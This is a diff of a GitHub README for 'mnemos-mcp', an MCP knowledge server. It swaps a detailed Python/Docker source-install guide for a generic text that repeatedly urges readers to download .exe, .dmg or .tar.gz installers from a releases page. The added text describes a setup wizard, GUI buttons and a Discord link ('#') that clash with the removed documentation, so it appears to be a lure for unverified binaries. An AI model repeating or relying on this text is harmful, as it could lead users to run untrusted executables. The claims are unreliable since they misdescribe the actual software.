@@ -1,205 +1,75 @@
-# 🧠 Mnemos
+# 🧠 mnemos-mcp - Your Private Knowledge Server Made Easy
 
-**Self-hosted, Multi-context Memory Server for Developers**
+## 🚀 Getting Started
 
-Mnemos is an MCP compatible knowledge server that turns your documentation piles into a multi context memory system. It organizes documents into isolated collections, eliminates redundant processing with content hashing, and runs fully offline using Postgres + pgvector and Ollama.
+Welcome to mnemos-mcp! This application helps you transform documents into searchable knowledge. With features like multi-collection isolation and local vector search, you can keep your data private and accessible. Follow these simple steps to download and run mnemos-mcp on your system.
 
-## Features
+## 📥 Download Now
 
-- **Multi-context Collections**: Isolate your memory by project (e.g., `react-docs`, `rust-book`, `company-internal`) with case insensitive search filtering.
-- **Deterministic Re-ingestion**: SHA-256 content hashing guarantees idempotent operation—skipping unchanged files and automatically re-chunking on diffs.
-- **Enhanced Terminal UI**: Explore your context with a full screen search interface, result navigation, and detailed chunk inspection modals.
-- **Recursive Site Crawling**: Ingest entire documentation sites with path based filtering (e.g., crawl only `/learn` on `react.dev`).
-- **Stable Local Embeddings**: Optimized for Ollama with persistent connections, automatic runner backoff, and load throttling.
-- **Chunk Quality Control**: Automatic noise filtering (minimum length thresholds + alphanumeric validation) ensures high quality retrieval.
-- **100% Private**: Fully offline. Your context never leaves your local machine.
+[![Download mnemos-mcp](https://img.shields.io/badge/Download%20mnemos--mcp-blue)](https://github.com/ELSAKKK/mnemos-mcp/releases)
 
-## Quick Start
+## 🔍 Features
 
-### Prerequisites
+- **Multi-Collection Isolation**: Keep different topics separate for better organization.
+- **Deterministic Ingestion**: Ensure consistent results every time you add documents.
+- **Local Vector Search**: Find information quickly without relying on external servers.
+- **100% Private**: Your data remains on your machine; no third parties involved.
+- **Zero Vendor Lock-in**: Use the features without being tied to any specific provider.
 
-- Docker & Docker Compose
-- Python 3.11+
-- [Ollama](https://ollama.ai) (for local embeddings)
+## 🖥️ System Requirements
 
-### 1. Install Ollama & Pull Embedding Model
+To run mnemos-mcp effectively, ensure your system meets the following requirements:
 
-```bash
-brew install ollama
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **RAM**: At least 4GB of RAM. More recommended for larger collections.
+- **CPU**: Modern multi-core processor. 
+- **Disk Space**: Minimum of 200MB free space for installation. Additional space will be needed for documents and search index.
 
-ollama serve
+## 📂 Download & Install
 
-ollama pull nomic-embed-text
-```
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/ELSAKKK/mnemos-mcp/releases) to find the latest version of mnemos-mcp.
 
-### 2. Start the Database
+2. **Download the Latest Version**: On the Releases page, look for the latest release. Download the version that matches your operating system. 
 
-```bash
-cd docker
-docker-compose up -d
-```
+3. **Install the Application**: Follow the installation instructions relevant to your OS:
+   - **Windows**: Double-click the downloaded .exe file and follow the prompts.
+   - **macOS**: Open the .dmg file, drag the mnemos-mcp app to your Applications folder.
+   - **Linux**: Extract the .tar.gz file and run the included script.
 
-### 3. Install Dependencies
+4. **Run the Application**: After installation completes, open mnemos-mcp from your applications menu or double-click the icon.
 
-```bash
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
+5. **Initial Setup**: Upon your first run, follow the setup wizard to configure basic settings and create your first collection.
 
-### 4. Start the Server
+## ⚙️ Using mnemos-mcp
 
-```bash
-# Option A: Start via CLI (recommended)
-python cli/mnemos.py server
+Once you have installed mnemos-mcp, you can start adding your documents:
 
-# Option B: Run API directly (development)
-uvicorn src.main:app --reload
-```
+1. **Create a Collection**: Click on "New Collection" to organize your documents by topic or category.
+   
+2. **Add Documents**: Use the "Add Documents" button to upload files. You can add PDFs, Word documents, or text files.
+   
+3. **Search**: Type any keyword related to your documents in the search bar. The application will display results matching your query quickly.
 
-### 5. Add Documents
+4. **Manage Collections**: Revisit your collections to add more documents or edit existing ones. 
 
-```bash
-python cli/mnemos.py add ./docs/my-document.pdf --collection my-project
+5. **Backup Your Data**: Regularly back up your collections to avoid data loss. Use the export feature in the settings menu.
 
-# Or crawl a site
-python cli/mnemos.py ingest https://react.dev/learn --path-filter /learn --collection react
-```
+## 📘 Support & Documentation
 
-### 6. Search
+To get help or find more information about using mnemos-mcp, check our [Wiki](https://github.com/ELSAKKK/mnemos-mcp/wiki). The wiki contains detailed guides on features, troubleshooting, and tips to maximize your experience.
 
-```bash
-python cli/mnemos.py search "how to use useEffect"
-```
+If you encounter any issues or have questions not covered in the Wiki, feel free to open an issue on our [GitHub repository](https://github.com/ELSAKKK/mnemos-mcp/issues). 
 
-## CLI Commands
+## 💬 Community & Feedback
 
-| Command | Description | Flags |
-|---------|-------------|-------|
-| `mnemos add <path>` | Add a document or directory | `-c <collection>`, `-r` (recursive) |
-| `mnemos ingest <url>` | Ingest a URL or crawl a site | `-c <collection>`, `--path-filter` |
-| `mnemos search <query>` | Search for relevant context | `-c <collection>`, `-k <limit>` |
-| `mnemos list` | List all documents | `-c <collection>`, `-n <limit>` |
-| `mnemos export <file>` | Backup knowledge base to JSON | `-c <collection>` |
-| `mnemos delete <id>` | Delete a document | `-f` (force) |
-| `mnemos server` | Start the API server | `--host`, `--port` |
+We value your feedback. Join our community on [Discord](#) to share your experiences, ask questions, or suggest new features. Your input helps us improve the application.
 
-## API Endpoints
+## 📣 Additional Resources
 
-### REST API
+- **Documentation**: [Official Documentation](https://github.com/ELSAKKK/mnemos-mcp/wiki)
+- **Release Updates**: [Product Updates](https://github.com/ELSAKKK/mnemos-mcp/releases)
+- **Contributing**: Want to help? Check out the [Contribution Guidelines](https://github.com/ELSAKKK/mnemos-mcp/blob/main/CONTRIBUTING.md) for more details.
 
-Mnemos provides a standard REST API for document management and operations.
+[![Download mnemos-mcp](https://img.shields.io/badge/Download%20mnemos--mcp-blue)](https://github.com/ELSAKKK/mnemos-mcp/releases) 
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `POST` | `/api/documents` | Upload a document |
-| `GET` | `/api/documents` | List all documents |
-| `GET` | `/api/collections` | List all unique collections |
-| `GET` | `/api/documents/export` | Full JSON backup of chunks |
-| `DELETE` | `/api/documents/{id}` | Delete a document |
-| `POST` | `/api/search` | Vector similarity search |
-| `POST` | `/api/ingest/url` | Ingest a single URL |
-| `POST` | `/api/ingest/site` | Crawl a documentation site |
-| `GET` | `/api/health` | Health & Stats check |
-
-### MCP Endpoints
-
-Mnemos exposes its retrieval capabilities via the Model Context Protocol (MCP), allowing AI agents to query it as an external context provider. Mnemos is designed to be stateless from the MCP client’s perspective; all persistence lives server-side.
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `GET` | `/mcp/tools` | List available MCP tools |
-| `POST` | `/mcp/call` | Execute an MCP tool |
-
-## MCP Integration
-
-### Claude Desktop
-
-Add to your Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json`):
-
-```json
-{
-  "mcpServers": {
-    "mnemos": {
-      "command": "curl",
-      "args": ["-X", "POST", "http://localhost:8000/mcp/call", "-H", "Content-Type: application/json", "-d"]
-    }
-  }
-}
-```
-
-### Available MCP Tools
-
-- **search_context**: Search the knowledge base for relevant context
-- **list_documents**: List all documents in the knowledge base
-- **get_document_info**: Get detailed information about a document
-
-## Configuration
-
-Environment variables (`.env`):
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `DATABASE_URL` | `postgresql+asyncpg://...` | Postgres connection string |
-| `EMBEDDING_PROVIDER` | `ollama` | `ollama` (local-first default) or `openai` |
-| `EMBEDDING_MODEL` | `nomic-embed-text` | Ollama embedding model |
-| `OLLAMA_BASE_URL` | `http://127.0.0.1:11434` | Ollama API URL |
-| `CHUNK_SIZE` | `300` | Target characters per chunk |
-| `CHUNK_OVERLAP` | `40` | Overlap between chunks |
-
-## Architecture
-
-```mermaid
-graph TD
-    User([User CLI / App]) --> API[FastAPI Server]
-    API --> DB[(PostgreSQL + pgvector)]
-    API --> Ollama[Ollama Local Embeddings]
-    
-    subgraph Ingestion Pipeline
-        API --> Parser[Document Parser]
-        Parser --> Chunker[Text Chunker]
-        Chunker --> HashCheck[SHA-256 Content Hash]
-        HashCheck --> Embedding[Vector Generation]
-    end
-    
-    subgraph Retrieval
-        API --> Search[Vector Search]
-        Search --> Context[Context Assembler]
-    end
-```
-
-## Design Principles
-
-- **Local-first by default**: All heavy lifting (vectors/search) happens on your hardware.
-- **Deterministic ingestion**: SHA-256 hashing ensures idempotency and safe re-runs.
-- **Explicit context isolation**: Multi-collection support prevents cross-project context pollution.
-- **Inspectable retrieval**: Similarity scores and chunk metadata are exposed to build trust.
-- **Zero vendor lock-in**: Standards-based tech stack (Postgres, MCP, REST).
-
-## Supported Embedding Models
-
-| Model | Dimensions | Notes |
-|-------|------------|-------|
-| `nomic-embed-text` | 768 | Default, good balance |
-| `mxbai-embed-large` | 1024 | Higher quality |
-| `all-minilm` | 384 | Faster, smaller |
-
-## Security Posture
-
-- **Local-Only**: By default, Mnemos binds to `0.0.0.0` but does not include authentication. It is intended for local use or behind a secure tunnel.
-- **No External Calls**: All vector generation and retrieval happen locally. No telemetry or document data is sent to external servers.
-- **SQLi Prevention**: Uses SQLAlchemy ORM and parameterized queries for all database interactions.
-
-## Non-Goals
-
-- **Cloud Hosting**: Mnemos is not designed to be a multi-tenant cloud SaaS.
-- **Advanced LLM Orchestration**: It focuses on context provision, not on being a full RAG agent.
-- **Browser Automation**: Ingestion is via CLI or URL crawler, not a GUI automation tool.
-
-## Development
-
-```bash
-black src/ cli/
-
-pytest tests/
-```
+Thank you for choosing mnemos-mcp! Enjoy building your private knowledge server.
